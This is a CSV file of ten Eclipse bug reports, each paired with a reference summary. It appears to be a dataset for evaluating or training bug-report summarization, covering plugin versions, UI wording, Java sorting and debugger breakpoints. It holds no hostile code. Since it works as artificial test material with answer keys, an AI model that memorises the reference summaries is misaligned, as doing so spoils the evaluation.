bug.id,bug_report,ground_truth_summary
6,Bump  maven-war-plugin version to 2.4 in org.eclipse.m2e.editor.xml/plugin.xml,Update maven-war-plugin template to 2.4
99,"The name of the feature for the SDK reads ""Eclipse Project SDK"" which is rather weird when shown in presence of the ""Eclipse SDK"" product like for example in the About > Installed Software dialog",SDK feature needs a better name
196,Build Identifier: 20100617-1415  Missing type arguments on org.eclipse.pde.internal.build.publisher  Reproducible: Always,Missing type arguments on org.eclipse.pde.internal.build.publisher
250,"I20070904-0800  On line 853 and 856 in TemplatePreferencePage two strings are compared with the string function compareToIgnoreCase to sort a table.  1. Why should one want to ignore the case when sorting, I've never seen that anywhere else? 2. Why not use Collator?      * Note that this method does <em>not</em> take locale into account,      * and will result in an unsatisfactory ordering for certain locales.      * The java.text package provides <em>collators</em> to allow      * locale-sensitive ordering.       Probably got missed when fixing bug 157093",[implementation] TemplatePreferencePage does compareToIgnoreCase
273,"There is one build path warning in the platform.ui workspace: org.eclipse.ui.examples.adapterservice uses JRE 6 for compliance level and build path.  Every other project uses JRE 8 for BREE, compliance level and classpath, therefore this one should use 8, too.",[examples] org.eclipse.ui.examples.adapterservice requires JRE 6
312,"The usage of    <if cond="""">   </if> is not mentioned in the reference.",Document conditional components
397,These lines in .handleKey are not easy to understand  ignore = (event.stateMask ^ SWT.ALT) == 0 || 		(event.stateMask ^ SWT.CTRL) == 0 || 		(event.stateMask ^ (SWT.ALT | SWT.SHIFT)) == 0 || 		(event.stateMask ^ (SWT.CTRL | SWT.SHIFT)) == 0;,[StyledText] Simplify boolean expression
428,"In the wizard page, the arrows are denoted by <-- and -->, which are not looking good. Also the UI guide lines hints on using only < and > See: http://wiki.eclipse.org/User_Interface_Guidelines#Multiple_Item_Selection  Now Platform UI has a similar widget Configure Columns dialog ( Problems View-> Columns... ) We use < and >. It would be good if PDE switches to this format to have consistency in SDK",The arrows in the Import plug-ins and fragments wizard page could be changed
505,20021105  Perform a scrapbook launch. Notice in Run/Debug drop downs there is entry like: Scrap.jpage-Scrapbook-1037204315937,Scrapbook launches showing up in history
516,Breakpoints that are set in anonymous inner classes that are contained in inner  classes are not hit.  Breakpoints in inner classes that are contained in inner  classes ARE hit,Breakpoints in an InnerClass anonymous inner classes are not hit
